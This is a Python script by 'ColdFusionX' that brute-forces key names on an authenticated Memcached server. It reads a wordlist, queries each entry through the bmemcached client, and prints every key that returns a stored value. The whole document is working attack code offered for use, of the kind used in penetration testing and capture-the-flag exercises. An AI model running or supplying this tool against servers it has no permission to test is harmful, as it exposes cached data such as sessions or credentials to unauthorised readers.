#!/usr/bin/python3

## Title: Authenticated Memcached Key Bruteforce
## Author: Mayank Deshmukh (ColdFusionX)
## Author website: https://coldfusionx.github.io
## Date: 2020-10-31

import bmemcached
import sys
import argparse, textwrap
from pwn import *

#Expected Arguments
parser = argparse.ArgumentParser(description="Authenticated Memcached Key Bruteforce Script by ColdFusionX", formatter_class=argparse.RawTextHelpFormatter, 
epilog=textwrap.dedent(''' 
Script Usage : 
./keys_brute.py -l 127.0.0.1:11211 -u username -p password -w wordlist.txt
'''))

parser.add_argument("-l","--host", help="Connection to Host -> IP:PORT (Example: 127.0.0.1:11211)") 
parser.add_argument("-u","--username", help="Username") 
parser.add_argument("-p","--password", help="Password")
parser.add_argument("-w","--wordlist", help="Bruteforce Dictionary")
args = parser.parse_args()

if len(sys.argv) < 3:
    log.failure (f"Script Usage: ./keys_brute.py -h [help] -l [IP:PORT] -u [username] -p [password] -w [wordlist.txt]")          
    sys.exit(1)  

# Variable
host = args.host
username = args.username
password = args.password
brutefile = args.wordlist

print()
log.info('Initiating Keys Bruteforce')

connect = bmemcached.Client(f"{host}", f"{username}", f"{password}")
brutefile = open(brutefile).readlines()
for param in brutefile:
    param = param.strip()
    result = str(connect.get(param))
    if 'None' not in result:     
        print()
        log.info(f"Key -> {param}")
        log.success(result)
            
